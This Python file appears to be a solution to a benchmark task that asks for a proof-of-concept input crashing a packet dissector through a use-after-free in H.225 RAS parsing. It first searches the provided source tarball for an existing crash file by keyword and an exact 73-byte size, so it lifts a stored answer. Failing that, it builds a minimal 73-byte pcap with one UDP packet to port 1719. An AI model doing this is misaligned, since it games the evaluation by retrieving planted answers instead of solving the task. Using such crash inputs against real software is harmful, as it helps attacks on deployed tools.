import os
import struct
import tarfile
from typing import Optional, Tuple


def _inet_aton_ipv4(ip: str) -> bytes:
    parts = ip.split(".")
    if len(parts) != 4:
        raise ValueError("invalid ipv4")
    return bytes(int(p) & 0xFF for p in parts)


def _ip_checksum(header: bytes) -> int:
    if len(header) % 2 != 0:
        header += b"\x00"
    s = 0
    for i in range(0, len(header), 2):
        s += (header[i] << 8) | header[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _build_ipv4_udp_packet(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    payload: bytes,
    ttl: int = 64,
) -> bytes:
    src_ip_b = _inet_aton_ipv4(src_ip)
    dst_ip_b = _inet_aton_ipv4(dst_ip)

    udp_len = 8 + len(payload)
    ip_total_len = 20 + udp_len

    ver_ihl = 0x45
    tos = 0
    identification = 0
    flags_frag = 0
    proto = 17  # UDP
    hdr_checksum = 0

    ip_hdr_wo_csum = struct.pack(
        "!BBHHHBBH4s4s",
        ver_ihl,
        tos,
        ip_total_len,
        identification,
        flags_frag,
        ttl,
        proto,
        hdr_checksum,
        src_ip_b,
        dst_ip_b,
    )
    csum = _ip_checksum(ip_hdr_wo_csum)
    ip_hdr = struct.pack(
        "!BBHHHBBH4s4s",
        ver_ihl,
        tos,
        ip_total_len,
        identification,
        flags_frag,
        ttl,
        proto,
        csum,
        src_ip_b,
        dst_ip_b,
    )

    udp_checksum = 0  # optional for IPv4
    udp_hdr = struct.pack("!HHHH", src_port & 0xFFFF, dst_port & 0xFFFF, udp_len & 0xFFFF, udp_checksum)

    return ip_hdr + udp_hdr + payload


def _build_pcap(dlt: int, packets: Tuple[bytes, ...]) -> bytes:
    # pcap global header (little-endian)
    gh = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, dlt)
    out = bytearray(gh)
    ts_sec = 0
    ts_usec = 0
    for pkt in packets:
        incl = len(pkt)
        ph = struct.pack("<IIII", ts_sec, ts_usec, incl, incl)
        out += ph
        out += pkt
        ts_sec += 1
    return bytes(out)


def _looks_like_capture(data: bytes) -> bool:
    if len(data) < 4:
        return False
    # pcap (little or big endian), pcapng
    if data[:4] in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4", b"\x4d\x3c\xb2\xa1", b"\xa1\xb2\x3c\x4d"):
        return True
    if data[:4] == b"\x0a\x0d\x0d\x0a":
        return True
    return False


def _find_embedded_poc(src_path: str) -> Optional[bytes]:
    try:
        tf = tarfile.open(src_path, mode="r:*")
    except Exception:
        return None

    best: Optional[bytes] = None
    best_score = (10**9, 10**9)  # (abs(size-73), size)

    keywords = ("h225", "ras", "next_tvb", "uaf", "use-after-free", "crash", "poc", "repro", "fuzz", "corpus", "testcase")
    exts = (".pcap", ".cap", ".pcapng", ".bin", ".raw", ".dat")

    try:
        for m in tf:
            if not m.isreg():
                continue
            name_l = (m.name or "").lower()
            size = m.size
            if size <= 0 or size > 4096:
                continue

            interesting = any(k in name_l for k in keywords) or name_l.endswith(exts)
            if not interesting and size != 73:
                continue

            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue

            if not data:
                continue

            if not _looks_like_capture(data):
                if size != 73:
                    continue

            score = (abs(len(data) - 73), len(data))
            if score < best_score:
                best_score = score
                best = data
                if best_score == (0, 73):
                    break
    finally:
        try:
            tf.close()
        except Exception:
            pass

    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = _find_embedded_poc(src_path)
        if poc is not None:
            return poc

        # Minimal pcap with a single raw IPv4/UDP packet to port 1719 (H.225 RAS).
        # Total file length = 24 (global) + 16 (pkt hdr) + 33 (packet) = 73 bytes.
        payload = b"\x00" * 5
        pkt = _build_ipv4_udp_packet(
            src_ip="1.1.1.1",
            dst_ip="2.2.2.2",
            src_port=1719,
            dst_port=1719,
            payload=payload,
            ttl=64,
        )
        return _build_pcap(101, (pkt,))